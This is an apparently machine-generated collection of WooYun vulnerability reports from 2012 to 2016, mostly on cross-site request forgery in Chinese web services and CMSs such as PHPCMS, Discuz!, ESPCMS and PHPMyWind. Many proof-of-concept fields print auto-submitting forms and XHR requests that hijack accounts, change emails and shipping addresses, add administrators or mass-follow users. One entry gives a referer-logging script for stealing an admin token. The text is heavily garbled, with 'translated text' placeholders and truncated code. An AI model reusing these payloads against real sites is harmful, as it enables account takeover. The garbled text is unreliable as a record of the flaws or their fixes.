### [wooyun-2014-061443] PHPCMS translated textenterlineCSRFattack
**Vendor**: phpcms | **Year**: 2014 | **Type**: CSRF

**Meta-thinking**: Trigger signal: admin backendmanagement

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: phpcmsinstallgoodaftertranslated textlink.translated textlinktexttwotext:textlinkandimagelink.itsinimagelink,administratorintextwhen,imagewilldirectlytextadmin backend.textadmin backendurlinispackettextthispc_hash,wethencaninimagerefererinsidetexttothispc_hash~~textnottext?exploitmethodtextvulnerabilityprove.

**POC**: textIinlocaltextsingletextonetextrefererscript:<?php$referer = isset($_SERVER['HTTP_REFERER']) ? $_SERVER['HTTP_REFERER'] : '';file_put_contents('referer.txt', $referer);?>thenputthisscriptasimageaddress,translated textchain:administratorinadmin backendtextquestion"textlink"functionalitywhen,Ialreadystealitspc_hash:textin,wetextcanputthistextonepoint.for exampleusephpoutputonetranslated textlogo,this waynottranslated textpc_hash,translated textonetranslated textchainrequest.thistextIlocalalreadytextreferer:thattext,textpc_h

**Bypass**: Direct exploitation

**Fix**: textgoodrecommend.textputpc_hashputinurlin.
---

---
### [wooyun-2012-06947] a certain Internet companysubsite Apache vulnerability
**Vendor**: a certain Internet company | **Year**: 2012 | **Type**: system/service patch not timely

**Meta-thinking**: Trigger signal: functional testing

**Insight**: system/service patch not timely lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify system/service patch not timely-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: Apache httponly cookie leakage,personaltextastextisCSRF...https://example.com/[redacted]

**POC**: 1;open : https://example.com/[redacted]  interceptandmodifycookieinformationastext:text:ifoperationsuccess,onlywillappeartwo times,No.one timesiscometext host: vip.some-domain.comNo.two timescometext host:vipfunc.some-domain.com two timestextonlytextputcookievaluemodifyastextthen can,ifhaslarge amount ofRequesttranslated text,thattext!textoperationtext.2;two timestextandmodifyoperationafter,return400:textthattextistextalltext,textbeforeinputistextfortext,nottextApachetextconfigurationLimitRequestFieldSizeishastextlargetext.thisisforhttponlytext,of course,hereonlyistextundertranslated text,ifhastexthearttext.....translated text.nottextothersitehastext

**Bypass**: Direct exploitation

**Fix**: translated textlocationhandle or textApache....
---

---
### [wooyun-2013-022582] translated textcsrfcanhijackuseraccount
**Vendor**: translated text | **Year**: 2013 | **Type**: CSRF

**Meta-thinking**: Trigger signal: functional testing

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: translated textchangeemaillocationnotvalidationtoken,canthroughattackertextheartconstructoneformmodifytextaffectedtextemail,thenthencanrecoverpasswordtexttohijacktext.textforemailneedtextonetext,socanthroughonenumbertextcometranslated textemail.

**POC**: POC:<html><body><form name="csrf" action="https://example.com/[redacted]" method="POST"><script>var email =['root1@wooyun.org','root2@wooyun.org','root3@wooyun.org','root4@wooyun.org','root5@wooyun.org','root6@wooyun.org','root7@wooyun.org','root8@wooyun.org','root9@wooyun.org','root10@wooyun.o

**Bypass**: Direct exploitation

**Fix**: textanduserinformationoperationonetextvalidationtexttokentext20rank,requesting a reward
---

---
### [wooyun-2013-026265] a certain social platformcsrfdeleteusera certain social platform
**Vendor**: a certain Internet company | **Year**: 2013 | **Type**: CSRF

**Meta-thinking**: Trigger signal: functional testing

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: issuetextis:t.hk.some-domain.com1.sendtextonetexta certain social platformclickdeleteandcapture packets,directlyGETrequest;https://example.com/[redacted]

**POC**: see detailed description

**Bypass**: Direct exploitation

**Fix**: youtext
---

---
### [wooyun-2016-0167674] a certain social platforma certain social platformCSRFofpointIlinksenda certain social platform(canworm)
**Vendor**: a certain social platforma certain social platform | **Year**: 2016 | **Type**: CSRF

**Meta-thinking**: Trigger signal: functional testing

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: functionalityinthispage:https://example.com/[redacted]

**POC**: testpage<form action="https://example.com/[redacted]" method="post"><input type="text" name="id" value="24413"/><input type="text" name="res_name" value="movie"/><input type="text" name="newsid" value="dafen_movietest2_24413"/><input type="text" name="allScore" value="10"/><input type="te

**Bypass**: filterBypass

**Fix**: text
---

---
### [wooyun-2015-0123760] parttextone locationSQL injectionone issue
**Vendor**: parttext | **Year**: 2015 | **Type**: SQL injectionvulnerability

**Meta-thinking**: Trigger signal: Parametersinjection

**Insight**: SQL injectionvulnerability lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify SQL injectionvulnerability-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: POST https://example.com/[redacted]

**POC**: (see original)

**Bypass**: Direct exploitation

**Fix**: (int)
---

---
### [wooyun-2014-078786] textlargegamecommunity-textboost followers
**Vendor**: textlargeintext | **Year**: 2014 | **Type**: CSRF

**Meta-thinking**: Trigger signal: functional testing

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: textlargegamecommunityhttps://example.com/[redacted]

**POC**: texttestcsrf,butnotranslated textnotwilltext.thenonlytext peoplefollowerstestunder..follow:https://example.com/[redacted]

**Bypass**: Direct exploitation

**Fix**: question:translated text!?
---

---
### [wooyun-2014-080153] PageAdmin CSRF vulnerability#2
**Vendor**: pageadmin.net | **Year**: 2014 | **Type**: CSRF

**Meta-thinking**: Trigger signal: functional testing

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**:

**POC**: (see original)

**Bypass**: Direct exploitation

**Fix**: Strengthen input validation
---

---
### [wooyun-2014-075352] a certain social platforma certain social platformcsrfboost followers
**Vendor**: a certain social platform | **Year**: 2014 | **Type**: CSRF

**Meta-thinking**: Trigger signal: authentication interface

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: noforreferervalidation,noaddtokencausinglog inhttps://example.com/[redacted] nbaofficialcommunityclickfollow capture packets onlyhasuid..

**POC**: constructpoc<!DOCTYPE HTML><html><body><form id="demo" name="demo" action="https://example.com/[redacted]" method="POST"><input type="text" name="uid" value="3138469231" /><input type="submit" value="submit" /></form><script>document.demo.submit();</script></body></html>thisisItextquestionbeforefollowtextquestionafterpagetext

**Bypass**: Direct exploitation

**Fix**: validationreferer,addtoken
---

---
### [wooyun-2015-0124159] 6textarbitrarytextfollow(textthisstreamertextonhomepage)
**Vendor**: sixtext | **Year**: 2015 | **Type**: CSRF

**Meta-thinking**: Trigger signal: functional testing

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: ~~

**POC**: <html><!-- CSRF PoC - generated by Burp Suite Professional --><body><form action="https://example.com/[redacted]"><input type="hidden" name="tuid" value="38015632" /><input type="hidden" name="act" value="p" /><input type="hidden" name="format" value="json" /></form></body><script>document.for

**Bypass**: Direct exploitation

**Fix**: tokenetc.
---

---
### [wooyun-2013-025342] textconsole ,unlimitedboost followers,alreadyworm,unlimitedfollowersintext
**Vendor**: textconsole | **Year**: 2013 | **Type**: CSRF

**Meta-thinking**: Trigger signal: functional testing

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: notextlook attextonetextbugcommenthostinformationgetisuserequestthentranslated textgetsenda certain social platformrequestaddress:thenfound senda certain social platformwhenimageaddressnorestrictionorfilter,thattextwethenuseimg  src comeconstruct csrfworm texta certain social platformhttps://example.com/[redacted]

**POC**: betextfollowfriend..f  textisaddfollowersc  textthenistextfthattexta certain social platformtextfollowI translated textItext..

**Bypass**: Direct exploitation

**Fix**: textcsrf
---

---
### [wooyun-2013-046515] a certain personalinheartCSRFdeletespecified usera certain social platform
**Vendor**: a certain portal site | **Year**: 2013 | **Type**: CSRF

**Meta-thinking**: Trigger signal: functional testing

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: a certain personalinheartdeletea certain social platformfunctionalityastranslated text,cancauseusera certain social platformbedelete.Ox1 . deletepersonala certain social platformwhencallinterfacehttps://example.com/[redacted] . whenattackertextheartconstructtexthasmaliciousattacklinktextcancauseusera certain social platformbedelete.userclickafter-------------------Iistranslated text-------------------on timessubmitwhen,wooyuntextthrough,cancantranslated text,translated textnotwilltranslated textvulnerability.a certain personalinheartboost followers.0x1 'Ia certain portal site'textfunctionality,willsendtextoneGETrequest,formatas follows: https://example.com/[redacted]

**POC**: translated text.

**Bypass**: encoding bypass

**Fix**: youtranslated text
---

---
### [wooyun-2015-0120484] a certain video site,a certain portal siteuserinheartmanybusinesscanhijackarbitraryaccount
**Vendor**: a certain portal site | **Year**: 2015 | **Type**: CSRF

**Meta-thinking**: Trigger signal: upload functionality

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: on timesconfigurationtextnumber,causingarbitraryhijackvulnerability:https://example.com/[redacted]

**POC**: as above~

**Bypass**: Direct exploitation

**Fix**: sametextuploadfiltercode,overwriteentirebusinesstext.
---

---
### [wooyun-2014-077157] appcmstextpermissionsbackupdatadatabasecandirectlydownload
**Vendor**: appcms.cc | **Year**: 2014 | **Type**: design flaw/logic error

**Meta-thinking**: Trigger signal: functional testing

**Insight**: design flaw/logic error lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify design flaw/logic error-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: appcmstranslated text,backupdatadatabasetextputinwebdirectory,andtextusetextfilenamedstore,sonotneedwindowsshortfilenamedrestriction,onlytextbackuptextdatadatabase,thencandirectlydownload.cantextcsrfbackupdatadatabase.requestcancsrf,getrequest.

**POC**: (see original)

**Bypass**: Direct exploitation

**Fix**: Strengthen input validation
---

---
### [wooyun-2013-028888] texta subsiteflashcross-domainvulnerability(texttesttextcode)
**Vendor**: text | **Year**: 2013 | **Type**: CSRF

**Meta-thinking**: Trigger signal: functional testing

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: look atcrossdomain.xml<?xml version="1.0"?><cross-domain-policy> <site-control permitted-cross-domain-policies="all" /><allow-access-from domain="*" /><allow-http-request-headers-from domain="*" headers="*"/></cross-domain-policy>1:permitted-cross-domain-policiesasallcauseloadtargettextontextfileascross-domain policyfile,textis one  peopleJPGtextcanbeloadastextfile![usethistextthatthenetc.textbexx!]2:allow-access-from textas"*"translated text,haspermissionsthroughflashreadcopytextincontent.3:allow-http-request-headers-fro

**POC**: personalhomepageurl:https://example.com/[redacted] flash.net.*;var mytest:String = "hello";var myloader = new URLLoader(new URLRequest("https://example.com/[redacted]"));myloader.addEventListener(Event.COMPLETE,test);myloader.load();function test(event:Event)

**Bypass**: Direct exploitation

**Fix**: crossdomain.xmlcontrolgood
---

---
### [wooyun-2013-037311] textYYspacelocationnottokencausingWrom(multiple locations)
**Vendor**: Guangzhou Duowan | **Year**: 2013 | **Type**: CSRF

**Meta-thinking**: Trigger signal: functional testing

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: postdata:articleTitle=fuck!&articleContent=tester~

**POC**: POST /feed/issueArticle.do HTTP/1.1Host: z.yy.comUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:23.0) Gecko/20100101 Firefox/23.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3Accept-Encoding: gzip, deflatebodytranslated text:<li jd

**Bypass**: Direct exploitation

**Fix**: token..text people10ranknottext?
---

---
### [wooyun-2013-043893] a certain Internet companyMXDCSRFcommenttexta certain social platform,space
**Vendor**: a certain Internet company | **Year**: 2013 | **Type**: CSRF

**Meta-thinking**: Trigger signal: functional testing

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**:

**POC**: textquestion:https://example.com/[redacted]

**Bypass**: Direct exploitation

**Fix**: token
---

---
### [wooyun-2013-035905] translated textone locationCSRFcantextfollow
**Vendor**: zhaoxiaoshuo.com | **Year**: 2013 | **Type**: CSRF

**Meta-thinking**: Trigger signal: functional testing

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: hereattacker:wooyunherevictim:xfkxfk1,textlook atlook atxfkxfkfollowtext:againlook atlook atwooyunfollowerstext:2,thenwooyunuser peoplexfkxfkusersendtext,textcontentthenisconstructgoodfollowwooyunselflink:3,look atlook atxfkxfktexttoshortmessage,thenclickshortmessageinlinkaddress:4,thisisxfkxfkalreadyfollowwooyun:xfkxfkfollowtextaddwooyunwooyunuserfollowersaddxfkxfk

**POC**: see detailed description

**Bypass**: Direct exploitation

**Fix**: defensecsrf
---

---
### [wooyun-2015-0107308] notranslated textCSRF vulnerability
**Vendor**: notranslated text | **Year**: 2015 | **Type**: CSRF

**Meta-thinking**: Trigger signal: functional testing

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: one,textweentermodifyemailthislinktwo,capture packets,textnotokenwetext peopletextsingleformgoodtextnextwethentextusertextopenform.Ithenlocaltestnotputinserveron!Ialreadyopenmaliciouslink,look atscreenshot

**POC**: usernamediszxcqianxiaoemailis443texta certain emailserviceagainlook atIclickemailinsideemailentirevulnerabilitytextthenisthis way

**Bypass**: Direct exploitation

**Fix**: addvalidation!token
---

---
### [wooyun-2014-066667] a certain communityCSRFone issue
**Vendor**: a certain portal site | **Year**: 2014 | **Type**: CSRF

**Meta-thinking**: Trigger signal: functional testing

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: onelinktextfollow.nocheckreferer,textnotextcsrfToken.follow/add followdatapacket as follows:POST /?action=friend_create&controller=ajax HTTP/1.1Host: i.club.sohu.comtp=baodabuping_sohu%40sohu.com&remark=&group_id=tptextasselfa certain portal siteuseridthenline(notistextname)onelinkthencanfollow/add follow,CSRFexploittextlinkas follows:https://example.com/[redacted]

**POC**: a certain portal siteuserclickontranslated textlink,thenwilltextfora certain accountfollow/add follow

**Bypass**: Direct exploitation

**Fix**: addtextcsrfprotection
---

---
### [wooyun-2013-046101] a certain search enginetexta certain functionalityCSRF vulnerabilitycallbackParametersissue
**Vendor**: a certain search engine | **Year**: 2013 | **Type**: CSRF

**Meta-thinking**: Trigger signal: Parametersinjection, authentication interface

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: 1. translated textonnotext,butFixtext,textlinkbeFixtranslated textthenis,&callbackParametersaftertext&_=Parametersontexttestwhentextissuccess,butthistranslated textthenfailed,text&_=ParametersbeFixtext,onlytext&_=nothasthenwillfailed,as shown.....2.texthostimagecanlook attext,sameonetranslated textinterceptGETrequest,buttext&_=Parameters,failed,add&_=Parameterssuccess,soItextheretext&_=Parameters3.this&callbackastext,Iopentranslated text,textNo.one timesinterceptGETrequesttext,as shown4.textnexttranslated text,Ithenscreenshotone times,as shown(1)(2)(3)(4)5.texthostimagetext,Iandnotext&_=Parameters,cantextiswillfailed,translated text timestest,foundfailedtextthenis&callbacktext,largetextin10textofinsideishastext6.hastextwilltext,thentranslated textthis way,setcsrflinkagainaddsendtextfortranslated text,textthentext10text,butbecausetextnottextnotcome,forisItextinterceptonerequest,

**POC**: (1)(2)(3)(4)

**Bypass**: Direct exploitation

**Fix**: translated text&_=beFixtext,againtest&callbacknumbervaluehasissue,translated textthenis10translated textlinktext,becausetranslated text,for examplefortranslated text,translated text,ortranslated textetc.etc.text,10textthencancantextquestionto,notonetextonestartthentextlink,cancoordinatesocial engineering,andtranslated text,notofnottextputlinktextimage,Fixrecommendthenis&callba
---

---
### [wooyun-2015-0114566] Discuz!forumCSRFone location
**Vendor**: Discuz! | **Year**: 2015 | **Type**: CSRF

**Meta-thinking**: Trigger signal: functional testing

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: test version:x3.2,forumneedtranslated textfunctionality(alltext-->sitefunctionality).whentextquestiononeurltext,cancanceltextspecified userhttp://[IP redacted]

**POC**: textoneuser,textthisuseruid,translated textis1textquestionas followsNo.threetranslated textthencancanceltext<img src="http://[IP redacted]

**Bypass**: Direct exploitation

**Fix**: token
---

---
### [wooyun-2015-0126749] cloudtranslated textrequestisGEThasCSRF
**Vendor**: texta certain e-commerce platformelectronictexthastextcompany | **Year**: 2015 | **Type**: CSRF

**Meta-thinking**: Trigger signal: functional testing

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: request:GET /cloud-web/integral/consume.htm?priId=1 HTTP/1.1text:{"consume":0}

**POC**: text peopleimg,sendget<img src="https://example.com/[redacted]">

**Bypass**: Direct exploitation

**Fix**: textposrequest
---

---
### [wooyun-2013-045223] translated textmain sitetranslated textcandeletearbitraryarticle
**Vendor**: translated text | **Year**: 2013 | **Type**: design flaw/logic error

**Meta-thinking**: Trigger signal: functional testing

**Insight**: design flaw/logic error lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify design flaw/logic error-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: translated textmain sitetranslated textcandeletearbitraryarticletext2 peoplenumber.inmain sitecandirectlysendarticle.thenItextpackethttps://example.com/[redacted] deletearticle.thentextonenumber sendonearticle.thendirectlysubmitthislink  articlethendeletehttps://example.com/[redacted] attack.

**POC**: Same as above

**Bypass**: Direct exploitation

**Fix**: thisis csrf textisauthorization bypass?
---

---
### [wooyun-2015-0101709] text800arbitraryaddinformationvulnerability
**Vendor**: text800 | **Year**: 2015 | **Type**: CSRF

**Meta-thinking**: Trigger signal: functional testing

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: text800addaddresslocationnotokenvalidation,causingcrsf1,useraddshipping addresslocation:https://example.com/[redacted] textoneformsubmitrequest4,returnaddressidnumber,addsuccess

**POC**: RT

**Bypass**: Direct exploitation

**Fix**: addtokenvalidation
---

---
### [wooyun-2015-0125243] translated textCSRFcancausingmodifyusershipping address
**Vendor**: translated text | **Year**: 2015 | **Type**: CSRF

**Meta-thinking**: Trigger signal: functional testing

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: <html><body><form action="https://example.com/[redacted]" method="POST"><input type="hidden" name="&#95;method" value="POST" /><input type="hidden" name="data&#91;Member&#93;&#91;consignee&#93;" value="1234" /><input type="hidden" name="data&#91;Member&#93;&#91;province&#93;" value="5" /><input type="hidden" name="data&#91;Member&#93;&#91;city&#93;" value="65" /><input type="hidden" name="

**POC**: ~~

**Bypass**: Direct exploitation

**Fix**: token~~
---

---
### [wooyun-2015-0140031] translated textundercsrftextmodifytextpersonalinformation
**Vendor**: translated textunder | **Year**: 2015 | **Type**: CSRF

**Meta-thinking**: Trigger signal: Parametersinjection

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: enterpersonalinformation,modifypersonalinformation,capture packetschecklook at:canlook attononotcantextParameters,cantextcsrfmaliciouslink,textcode is as follows:xmlhttp.open("POST", "https://example.com/[redacted]", true);xmlhttp.withCredentials = true;xmlhttp.setRequestHeader("Content-Type","application/x-www-form-urlencoded");xmlhttp.send("sex=0&marry=1&birth=2015-9-2&birthyear=2015&birthmonth=9&birthday=2&blood=B&birthprovince=%E5%8C%97%E4%BA%AC&birthcity=%E4%B8%9C%E5%9F%8E&

**POC**: Same as above

**Bypass**: Direct exploitation

**Fix**: validationrefereraddtoken
---

---
### [wooyun-2015-0107723] ESPCMSadmin backendCSRFmodifymanagementpassword
**Vendor**: ESPCMS enterprise website management system | **Year**: 2015 | **Type**: CSRF

**Meta-thinking**: Trigger signal: admin backendmanagement

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: modifyadministratorpasswordnovalidationtextpassword Itextistext capture packetsnotokenvaluevalidation constructformtext?ok canmodifyformconstructgood,butmodifygoodaftertextnotwilltextmodifypassword,butwilltranslated texttoadmin backend,this waythenwillbeadministratorfoundoroccurtext~~translated text???weexploittranslated text~wecreateonehtml,code is as follows<html><table style="left: 0px; top: 0px; position: fixed;z-index: 5000;position:absolute;width:100%;height:300%;background-color: black;"><tbody><tr><td style="color:#FFFFFF;z-index: 6000;vertical-align:top;"><h1>textcloudtest</h1></td></tr></tbody></table><<meta http-equi

**POC**: modifyadministratorpasswordnovalidationtextpassword Itextistext capture packetsnotokenvaluevalidation constructformtext?ok canmodifyformconstructgood,butmodifygoodaftertextnotwilltextmodifypassword,butwilltranslated texttoadmin backend,this waythenwillbeadministratorfoundoroccurtext~~translated text???weexploittranslated text~wecreateonehtml,code is as follows<html><table style="left: 0px; top: 0px; position: fixed;z-index: 5000;position:absolute;width:100%;height:300%;background-color: black;"><tbody><tr><td style="colo

**Bypass**: Direct exploitation

**Fix**: you know what to domodifytextneedvalidationtextpasswordthen can
---

---
### [wooyun-2016-0180311] a certain social platformforumCSRFbundle and impact description(manytextforumtextuse)
**Vendor**: a certain social platform | **Year**: 2016 | **Type**: CSRF

**Meta-thinking**: Trigger signal: Parametersinjection

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: thisvulnerabilitytextandtoa certain social platformtextforumpackettextnottextforuseundersitetext https://example.com/[redacted]     b4201dfdnumbercode https://example.com/[redacted]      b4201dfdtext https://example.com/[redacted]      b4201dfdtext https://example.com/[redacted]      b4201dfdtext https://example.com/[redacted]   4788b761text https://example.com/[redacted]   b4201dfdtext https://example.com/[redacted]  b4201dfdtext https://example.com/[redacted]      b4201dfdtext http://

**POC**: usetextforumas an example,texthastextonlytestfourtext,textentireforumallnotextcsrfprotection,othertranslated textlinecheck^_^1 modifyuserinformation<form action="https://example.com/[redacted]" method="post"><input type="hidden" name="formhash" value="aec0506d" /><input type="hidden" name="nicknamenew" value="GAY21888" /><input type="hidden" name="gend

**Bypass**: Direct exploitation

**Fix**: youtranslated text!
---

---
### [wooyun-2014-080964] a certain social platforma certain social platformone locationtextfunctionalityhasCSRF vulnerability(can modifyusera certain social platforma certain element)
**Vendor**: a certain social platforma certain social platform | **Year**: 2014 | **Type**: CSRF

**Meta-thinking**: Trigger signal: functional testing

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: new versiona certain social platformtextonetextfunctionality(texta certain textspaceonetext),theniscansetbackground music.throughcapture packetsaftertextbackground musica certain textURLas:https://example.com/[redacted] aftertexttokenIhandletextasallisthistext..directlyclickhostURLthencanlook attointextpersonalpagetexthas peoplebackground music:

**POC**: (see original)

**Bypass**: Direct exploitation

**Fix**: Strengthen input validation
---

---
### [wooyun-2013-035496] a certain search enginetextone locationcsrfvulnerabilitycantextfollowtext(cantextwilltextnumber)
**Vendor**: a certain search engine | **Year**: 2013 | **Type**: CSRF

**Meta-thinking**: Trigger signal: functional testing

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: https://example.com/[redacted]

**POC**: (see original)

**Bypass**: Direct exploitation

**Fix**: do not know
---

---
### [wooyun-2013-026182] a certain social platformcsrfboost followersvulnerability
**Vendor**: a certain Internet company | **Year**: 2013 | **Type**: CSRF

**Meta-thinking**: Trigger signal: functional testing

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: a certain social platformHKsite:https://example.com/[redacted]"t.some-domain.com"sitesametext,addonetextisGETrequest,text,sodirectlyconstructundertextrequest;https://example.com/[redacted]

**POC**: see detailed description

**Bypass**: Direct exploitation

**Fix**: youtext
---

---
### [wooyun-2015-0124904] translated text csrfone issue,textchangetextshipping address
**Vendor**: translated text | **Year**: 2015 | **Type**: CSRF

**Meta-thinking**: Trigger signal: Parametersinjection, authentication interface

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: log inaccountA,modifyitsshipping address,andcapture packets:checklook atitsshipping addressrequestaspostrequest,Same as abovenothasnotcantextParameters,texthascsrfforisconstructhtmlxmlhttp.open("POST", "https://example.com/[redacted]", true);xmlhttp.withCredentials = true;xmlhttp.setRequestHeader("Content-Type","application/x-www-form-urlencoded");xmlhttp.send("addrId=737093&name=woooo&province=13&city=1302&street=gktjgj&mobile=13200000000&phone=&zipCode=&isDefault=on")textquestionlinkcsrfboq.htmltextshipping addressuselook attotext

**POC**: Same as above

**Bypass**: Direct exploitation

**Fix**: tokenvalidationrefer
---

---
### [wooyun-2015-0100669] phpmywindtext5.2versionhasCSRFaddadministratorvulnerability
**Vendor**: phpmywind.com | **Year**: 2015 | **Type**: CSRF

**Meta-thinking**: Trigger signal: admin backendmanagement

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: text?inadmin backendaddadministratorwhentextburptextunderpacketlook atlook atistranslated text.POST /phpmywind/admin/admin_save.php HTTP/1.1Host: [IP redacted]User-Agent: Mozilla/5.0 (Windows NT 5.1; rv:36.0) Gecko/20100101 Firefox/36.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateReferer: http://[IP redacted] 33b5b_lastpos=ot

**POC**: <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"><html><head><title>OWASP CRSFTester Demonstration</title></head><body onload="javascript:fireForms()"><script language="JavaScript">var pauses = new Array( "62","47" );function pausecomp(millis){var date = new Date();var curDate = null;d

**Bypass**: Direct exploitation

**Fix**: text?add atokenrestriction~
---

---
### [wooyun-2015-0165308] a certain video siteone locationcsrfvulnerability
**Vendor**: a certain video site.com | **Year**: 2015 | **Type**: CSRF

**Meta-thinking**: Trigger signal: functional testing

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: thisvulnerabilitycantextforuptext,closeundertextthreetextparttextpermissions,textitssendtextvideonoparttext!csrftextinuserinheart-->filtermanagementin,https://example.com/[redacted]

**POC**: poc<html><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8" /><title>CSRF/exploit--a certain video site</title></head><body><form action="https://example.com/[redacted]" method="POST"><input type="hidden" name="format" value="json" /><input type="hidden" name="a

**Bypass**: Direct exploitation

**Fix**: addtoken;validationreffer
---

---
### [wooyun-2014-051267] a certain translated textCSRFboost followersanduseremailleakage
**Vendor**: a certain portal site | **Year**: 2014 | **Type**: CSRF

**Meta-thinking**: Trigger signal: functional testing

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**:

**POC**: translated text

**Bypass**: Direct exploitation

**Fix**: textrequestvalidationrefererortoken,textgoodtextisnottextuseuseremailenterlineencrypttext,textuserid
---

---
### [wooyun-2013-040453] a certain social platformone locationcsrfvulnerability
**Vendor**: a certain portal site | **Year**: 2013 | **Type**: CSRF

**Meta-thinking**: Trigger signal: functional testing

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: post:https://example.com/[redacted]]content=csrf

**POC**: as above

**Bypass**: Direct exploitation

**Fix**: youtext
---

---
### [wooyun-2012-05709] a certain social platformCSRF vulnerability--cancauseworm
**Vendor**: a certain Internet company | **Year**: 2012 | **Type**: CSRF

**Meta-thinking**: Trigger signal: authentication interface

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: PS:translated textthenbetextsendtowooyunon,textItraversal............1,log inhttps://example.com/[redacted]

